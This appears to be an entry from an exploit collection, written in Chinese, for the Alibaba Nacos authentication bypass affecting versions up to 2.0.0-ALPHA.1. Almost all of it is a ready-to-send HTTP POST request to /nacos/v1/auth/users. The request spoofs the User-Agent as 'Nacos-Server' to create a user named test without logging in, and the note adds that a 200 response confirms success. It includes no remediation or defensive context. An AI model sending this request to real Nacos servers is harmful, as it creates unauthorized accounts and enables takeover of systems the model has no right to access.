# Alibaba Nacos权限认证绕过漏洞

影响版本：  
- Nacos <= 2.0.0-ALPHA.1

发送POST请求，返回码200，创建用户成功
```
POST /nacos/v1/auth/users HTTP/1.1
Host:your-ip:8848
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Nacos-Server
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencode
Content-Length: 27

username=test&password=test
```